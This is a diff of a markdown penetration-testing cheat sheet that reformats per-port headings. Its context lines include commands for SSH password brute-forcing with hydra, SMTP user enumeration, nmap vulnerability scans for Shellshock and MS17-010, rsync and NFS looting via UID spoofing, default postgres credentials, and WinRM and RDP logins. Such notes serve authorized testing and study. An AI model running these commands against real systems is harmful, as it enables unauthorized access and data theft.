@@ -2,7 +2,9 @@
 
 
 
-**FTP**
+## **Ports**
+
+### **FTP**
 
 TCP port 21
 
@@ -61,7 +63,7 @@ End a FTP session.
 exit
 ```
 
-**SSH**
+### **SSH**
 
 TCP port 22
 
@@ -69,7 +71,7 @@ TCP port 22
 hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
 ```
 
-**SMTP**
+### **SMTP**
 
 TCP port 25.
 
@@ -96,7 +98,7 @@ smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TAR
 sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
 ```
 
-**HTTP**
+### **HTTP**
 
 TCP port 80
 
@@ -147,7 +149,7 @@ Check if the target is vulnerable to Shellshock
 sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$TARGET-nmap-scripts-80-http-shellshock
 ```
 
-**POP3**
+### **POP3**
 
 TCP port 110
 
@@ -159,7 +161,7 @@ RETR 1
 QUIT
 ```
 
-**RPC**
+### **RPC**
 
 TCP port 135
 
@@ -169,7 +171,7 @@ srvinfo
 netshareenum # print the real file-path of shares; good for accurate RCE
 ```
 
-**NetBIOS**
+### **NetBIOS**
 
 TCP port 139
 
@@ -177,7 +179,7 @@ TCP port 139
 nbtscan $TARGET
 ```
 
-**SMB**
+### **SMB**
 
 TCP port 445
 
@@ -217,7 +219,7 @@ sudo nmap $TARGET -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-
 sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
 ```
 
-**Rsync**
+### **Rsync**
 
 TCP port 873
 
@@ -227,7 +229,7 @@ rsync -av rsync://$TARGET/$SHARE --list-only
 rsync -av rsync://$TARGET/$SHARE loot
 ```
 
-**NFS**
+### **NFS**
 
 TCP port 2049
 
@@ -243,7 +245,7 @@ sudo sed -i -e 's/1001/5050/g' /etc/passwd
 cat /mnt/FOO/loot.txt
 ```
 
-**SQL**
+### **SQL**
 
 TCP port 3306
 
@@ -251,7 +253,7 @@ TCP port 3306
 mysql -u $USER -h $TARGET
 ```
 
-**RDP**
+### **RDP**
 
 TCP port 3389
 
@@ -263,7 +265,7 @@ sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp
 rdesktop -u administrator $TARGET
 ```
 
-**Postgres**
+### **Postgres**
 
 TCP port 5437
 
@@ -272,7 +274,7 @@ psql -U postgres -p 5437 -h $TARGET # postgres:postgres
 SELECT pg_ls_dir('/');
 ```
 
-**WinRM**
+### **WinRM**
 
 TCP port 5985
 
@@ -280,7 +282,7 @@ TCP port 5985
 evil-winrm -u $USER -p $PASSWORD -i $TARGET
 ```
 
-**IRC**
+### **IRC**
 
 TCP port 6667
 
